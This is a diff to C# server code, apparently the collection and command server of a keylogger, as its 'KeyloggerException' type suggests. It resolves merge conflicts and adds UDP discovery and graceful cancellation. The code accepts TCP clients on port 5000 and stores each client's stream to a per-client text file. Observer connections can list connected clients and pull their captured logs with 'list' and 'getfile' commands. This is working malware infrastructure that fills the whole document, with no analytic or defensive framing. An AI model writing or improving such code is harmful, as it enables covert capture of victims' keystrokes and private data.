@@ -22,15 +22,12 @@ namespace ServerCore
         private TcpListener _listener;
         private bool _running = false;
 
-<<<<<<< HEAD
         /// <summary>
         /// Starts the server and listens for incoming connections.
         /// </summary>
+        /// <param name="cancellationToken">Token to stop the server gracefully.</param>
         /// <returns>A task representing the asynchronous server operation.</returns>
-        public async Task RunAsync()
-=======
         public async Task RunAsync(CancellationToken cancellationToken = default)
->>>>>>> eeb19b3796f2a0839e32c8b80c6d2cfadff9ecc7
         {
             Console.WriteLine("Starting server on port 5000...");
             Directory.CreateDirectory("SaveData");
@@ -38,29 +35,26 @@ namespace ServerCore
             _listener = new TcpListener(IPAddress.Any, 5000);
             _listener.Start();
 
+            // Start the UDP discovery listener in the background
+            var discoveryListener = new DiscoveryListener();
+            _ = Task.Run(() => discoveryListener.StartAsync(6000), cancellationToken);
+
             _running = true;
             Console.WriteLine("Server is running. Press Ctrl+C to stop...");
-            //_ = Task.Run(AcceptClientsLoop);
 
-<<<<<<< HEAD
-            await Task.Delay(Timeout.Infinite);
-        }
-
-        /// <summary>
-        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
-        /// </summary>
-        /// <returns>A task representing the asynchronous loop operation.</returns>
-=======
-            //await Task.Delay(Timeout.Infinite); // menține serverul activ la nesfârșit
             try
             {
                 var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);
 
-                // Așteptăm fie cancelare, fie până când serverul este oprit
+                // Wait until cancellation requested or server stops
                 while (_running && !cancellationToken.IsCancellationRequested)
                 {
                     await Task.Delay(1000, cancellationToken);
                 }
+            }
+            catch (OperationCanceledException)
+            {
+                // Expected on cancellation
             }
             finally
             {
@@ -69,6 +63,7 @@ namespace ServerCore
                 Console.WriteLine("Server stopped");
             }
         }
+
 
         public async Task StopAsync()
         {
@@ -94,7 +89,10 @@ namespace ServerCore
             await Task.CompletedTask;
         }
 
->>>>>>> eeb19b3796f2a0839e32c8b80c6d2cfadff9ecc7
+        /// <summary>
+        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
+        /// </summary>
+        /// <returns>A task representing the asynchronous loop operation.</returns>
         private async Task AcceptClientsLoop()
         {
             while (_running)
@@ -126,7 +124,7 @@ namespace ServerCore
                 }
                 catch (Exception ex)
                 {
-                    throw new KeyloggerException("Failed to accept or process incoming client.", ex);
+                    Console.WriteLine($"Failed to accept or process incoming client: {ex.Message}");
                 }
             }
         }
@@ -154,7 +152,7 @@ namespace ServerCore
             var stream = handler.Stream;
             var buffer = new byte[1024];
             string safeFileName = handler.Id.Replace(":", "_");
-            string filePath = "SaveData\\" + safeFileName + ".txt";
+            string filePath = Path.Combine("SaveData", safeFileName + ".txt");
 
             StreamWriter writer = null;
 
@@ -177,7 +175,7 @@ namespace ServerCore
             }
             catch (Exception ex)
             {
-                throw new KeyloggerException($"Error while handling client {handler.Id}.", ex);
+                Console.WriteLine($"Error while handling client {handler.Id}: {ex.Message}");
             }
             finally
             {
@@ -199,75 +197,72 @@ namespace ServerCore
         {
             try
             {
-                while (_running)
+                var client = observer as ObserverClient;
+                var stream = client.Stream;
+                var buffer = new byte[1024];
+
+                while (_running && client.TcpClient.Connected)
                 {
-                    var client = observer as ObserverClient;
-                    var stream = client.Stream;
-                    var buffer = new byte[1024];
-
-                    while (_running && client.TcpClient.Connected)
+                    if (stream.DataAvailable)
                     {
-                        if (stream.DataAvailable)
+                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
+                        if (bytesRead == 0)
+                            break;
+
+                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
+                        Console.WriteLine("[Observer " + client.Id + "] Command: " + command);
+
+                        if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                         {
-                            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
-                            if (bytesRead == 0)
-                                break;
-
-                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
-                            Console.WriteLine("[Observer " + client.Id + "] Command: " + command);
-
-                            if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
+                            string response;
+                            lock (_lock)
                             {
-                                string response;
-                                lock (_lock)
-                                {
-                                    var ids = _clients.Select(c => c.Id);
-                                    response = "[LIST]" + string.Join("\n", ids);
-                                }
-
-                                byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
-                                await stream.WriteAsync(responseData, 0, responseData.Length);
+                                var ids = _clients.Select(c => c.Id);
+                                response = "[LIST]" + string.Join("\n", ids);
                             }
-                            else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
-                            {
-                                string clientId = command.Substring("getfile".Length).Trim();
-                                string safeFileName = clientId.Replace(":", "_");
-                                string filePath = Path.Combine("SaveData", safeFileName + ".txt");
 
-                                try
+                            byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
+                            await stream.WriteAsync(responseData, 0, responseData.Length);
+                        }
+                        else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
+                        {
+                            string clientId = command.Substring("getfile".Length).Trim();
+                            string safeFileName = clientId.Replace(":", "_");
+                            string filePath = Path.Combine("SaveData", safeFileName + ".txt");
+
+                            try
+                            {
+                                if (File.Exists(filePath))
                                 {
-                                    if (File.Exists(filePath))
+                                    string fileContent;
+                                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                    using (var sr = new StreamReader(fs))
                                     {
-                                        string fileContent;
-                                        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                                        using (var sr = new StreamReader(fs))
-                                        {
-                                            fileContent = await sr.ReadToEndAsync();
-                                        }
-                                        byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
-                                        await stream.WriteAsync(response, 0, response.Length);
+                                        fileContent = await sr.ReadToEndAsync();
                                     }
-                                    else
-                                    {
-                                        string errorMsg = "[ERROR]File not found";
-                                        byte[] response = Encoding.UTF8.GetBytes(errorMsg);
-                                        await stream.WriteAsync(response, 0, response.Length);
-                                    }
+                                    byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
+                                    await stream.WriteAsync(response, 0, response.Length);
                                 }
-                                catch (Exception ex)
+                                else
                                 {
-                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");
+                                    string errorMsg = "[ERROR]File not found";
+                                    byte[] response = Encoding.UTF8.GetBytes(errorMsg);
+                                    await stream.WriteAsync(response, 0, response.Length);
                                 }
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Error reading or sending file: {ex.Message}");
                             }
                         }
-
-                        await Task.Delay(100);
                     }
+
+                    await Task.Delay(100);
                 }
             }
             catch (Exception ex)
             {
-                throw new KeyloggerException($"Error while keeping observer {observer.Id} alive.", ex);
+                Console.WriteLine($"Error while keeping observer {observer.Id} alive: {ex.Message}");
             }
             finally
             {
